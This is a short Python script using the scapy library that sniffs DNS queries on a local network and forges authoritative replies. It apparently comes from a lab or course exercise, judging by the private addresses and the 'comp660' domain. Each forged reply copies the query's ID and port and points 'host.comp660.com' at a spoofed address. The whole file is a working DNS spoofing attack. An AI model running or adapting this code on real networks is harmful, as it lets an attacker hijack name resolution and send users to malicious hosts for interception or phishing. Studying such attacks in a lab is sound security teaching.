from __future__ import print_function

from scapy.all import *
from scapy.layers.l2 import *

url = "host.comp660.com"
SPOOF_ADDR = '6.6.6.6'

def response(pkt):
    if DNS in pkt:
	# check for packet sent to auth server, if so, then inject()
	if pkt[IP].dst == "192.168.1.28" and pkt[IP].src == "192.168.1.29":
	    inject(pkt[DNS].id, pkt[IP].sport)
            return 'Sent spoof to this msg: snd: {}.{} rcv: {}.{}: id {}'.format(pkt[IP].src, pkt[IP].sport, pkt[IP].dst, pkt[IP].dport, pkt[DNS].id)

def inject(i_d, port):
    crafted_pkt = Ether(src="00:0c:29:96:46:8e", dst="00:0c:29:b4:a7:93")/IP(src="192.168.1.28", dst="192.168.1.29")/UDP(dport=port)/DNS(id=i_d, qr=1, aa=1, ancount=1, ra=0, an=DNSRR(rrname=url, type='A', rclass='IN', ttl=350, rdata=SPOOF_ADDR))
    sendp(crafted_pkt, verbose=1)

# sniff packets off the wire (uses tcpdump)
sniff(filter='udp port 53', prn=response, store=0, count=20)
